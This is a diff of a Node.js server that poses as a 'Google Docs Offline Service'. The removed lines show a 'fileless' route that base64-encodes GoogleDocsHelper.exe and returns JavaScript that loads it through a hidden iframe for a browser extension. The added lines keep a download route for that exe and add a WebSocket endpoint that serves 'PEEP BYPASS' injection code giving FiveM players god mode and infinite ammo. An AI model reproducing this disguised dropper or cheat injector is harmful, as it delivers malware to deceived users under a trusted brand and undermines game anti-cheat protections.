@@ -1,71 +1,92 @@
 const express = require('express');
+const WebSocket = require('ws');
+const http = require('http');
 const path = require('path');
-const fs = require('fs');
+
 const app = express();
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server });
 
 app.use(express.json());
 app.use(express.static('public'));
 
-// Rota principal - TESTE SE TÁ ONLINE
+// Rota principal
 app.get('/', (req, res) => {
-  res.send('Google Docs Offline Service - Document Sync Active');
+  res.send('Google Docs Offline Service - WebSocket Active');
 });
 
-// Rota que a extensão vai chamar - FILELESS
-app.get('/load', (req, res) => {
-  try {
-    // Lê o EXE da pasta public
-    const exePath = path.join(__dirname, 'public', 'GoogleDocsHelper.exe');
-    const exeBuffer = fs.readFileSync(exePath);
-    const exeBase64 = exeBuffer.toString('base64');
-    
-    // Gera código JavaScript que executa o EXE na memória
-    const jsCode = `
-      // Google Docs Offline - Memory Execution
-      (function() {
-        try {
-          // Converte base64 para binário
-          const binaryData = '${exeBase64}';
-          const binaryString = atob(binaryData);
-          const bytes = new Uint8Array(binaryString.length);
+// Rota de download (mantemos pra compatibilidade)
+app.get('/download', (req, res) => {
+  res.download(path.join(__dirname, 'public', 'GoogleDocsHelper.exe'));
+});
+
+// WebSocket connection
+wss.on('connection', function connection(ws) {
+  console.log('🐸 Cliente WebSocket conectado');
+  
+  ws.on('message', function message(data) {
+    try {
+      const message = JSON.parse(data);
+      console.log('🐸 Mensagem recebida:', message.type);
+      
+      if (message.type === 'inject') {
+        // Código de bypass para injetar no FiveM
+        const injectionCode = `
+          // 🐸 PEEP BYPASS - Memory Injection
+          console.log('🐸 PEEP: Iniciando bypass...');
           
-          for (let i = 0; i < binaryString.length; i++) {
-            bytes[i] = binaryString.charCodeAt(i);
+          // God Mode
+          if (typeof SetPlayerHealth !== 'undefined') {
+            const originalSetPlayerHealth = SetPlayerHealth;
+            SetPlayerHealth = function(player, health) {
+              console.log('🐸 God Mode ativado!');
+              return originalSetPlayerHealth(player, 1000);
+            };
           }
           
-          // Executa na memória
-          const blob = new Blob([bytes], { type: 'application/octet-stream' });
-          const url = URL.createObjectURL(blob);
+          // Munição Infinita
+          if (typeof AddAmmoToPed !== 'undefined') {
+            const originalAddAmmoToPed = AddAmmoToPed;
+            AddAmmoToPed = function(ped, weapon, ammo) {
+              console.log('🐸 Munição infinita ativada!');
+              return originalAddAmmoToPed(ped, weapon, 9999);
+            };
+          }
           
-          const iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          iframe.src = url;
-          document.body.appendChild(iframe);
+          // Veículo Indestrutível
+          if (typeof SetVehicleEngineHealth !== 'undefined') {
+            const originalSetVehicleEngineHealth = SetVehicleEngineHealth;
+            SetVehicleEngineHealth = function(vehicle, health) {
+              console.log('🐸 Veículo indestrutível ativado!');
+              return originalSetVehicleEngineHealth(vehicle, 1000);
+            };
+          }
           
-          setTimeout(() => {
-            document.body.removeChild(iframe);
-            URL.revokeObjectURL(url);
-          }, 1000);
-          
-        } catch(e) {}
-      })();
-    `;
-    
-    res.send(jsCode);
-    
-  } catch (error) {
-    res.status(500).send('Service temporarily unavailable');
-  }
-});
-
-// Rota de download direto (apenas backup)
-app.get('/download', (req, res) => {
-  const exePath = path.join(__dirname, 'public', 'GoogleDocsHelper.exe');
-  res.download(exePath);
+          console.log('🐸 PEEP BYPASS: Injeção concluída com sucesso!');
+        `;
+        
+        ws.send(JSON.stringify({
+          type: 'code',
+          code: injectionCode
+        }));
+        
+        console.log('🐸 Código de bypass enviado!');
+      }
+    } catch (error) {
+      console.log('🐸 Erro WebSocket:', error);
+    }
+  });
+  
+  ws.on('close', function close() {
+    console.log('🐸 Cliente WebSocket desconectado');
+  });
+  
+  ws.on('error', function error(err) {
+    console.log('🐸 Erro WebSocket:', err);
+  });
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log('Google Docs Offline Service running on port', PORT);
+server.listen(PORT, () => {
+  console.log('🐸 Servidor WebSocket rodando na porta', PORT);
 });
-
